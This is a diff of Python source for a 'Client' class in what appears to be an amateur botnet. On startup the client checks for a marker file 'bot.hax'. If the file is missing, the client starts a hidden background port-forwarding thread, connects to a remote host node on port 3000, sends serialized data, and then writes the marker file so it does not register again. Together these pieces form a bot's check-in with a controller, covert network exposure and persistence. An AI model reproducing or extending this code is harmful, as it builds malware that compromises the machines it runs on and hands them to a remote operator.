@@ -1,24 +1,35 @@
 from common import common
 from common import commonio
 from bot import bot
+from common.commondefs import false
+from common.commondefs import true
 import socket
 import sys
+import os
+import threading
 
 class Client:
     def __init__(self, botRef: bot.Bot):
         self.bot = bot.Bot
         self.hostNode = common.RemoteAddr # Set host node addr for persistency
-        self.bot.user = botRef.user # Set bot user for persistency
-        self.bot.password = botRef.password # Set pass for persistency
         self.bot.host = botRef.host # Set host for persistency
-        self.bot.session = botRef.session # Set session for persistency
 
-        self.RegisterClient() # Register client
+        if os.path.isfile('bot.hax') == false:
+            self.RegisterClient() # Register client
     
     def RegisterClient(self):
+        print('\n-- INFO -- registering client...\n') # Log begin
+
         if self.hostNode == '': # Check for nil host node
             return 'invalid host node' # Return error
-            
+        
+        try:
+            portThread = threading.Thread(target=common.forwardPortStandard) # Init port thread
+            portThread.daemon = true # Run as background thread
+            portThread.start() # Start port forwarding thread
+        except Exception as e:
+            print(e) # Log found error
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Init socket
 
         sock.connect((common.RemoteAddr, 3000)) # Connect socket
@@ -40,3 +51,7 @@ class Client:
         print('successfully wrote '+str(len(serialized))+' bits of data') # Log success
 
         print('-- CONNECTION-- closing connection\n')
+
+        f = open('bot.hax', 'w') # Open file
+
+        f.write('despacito') # Write success
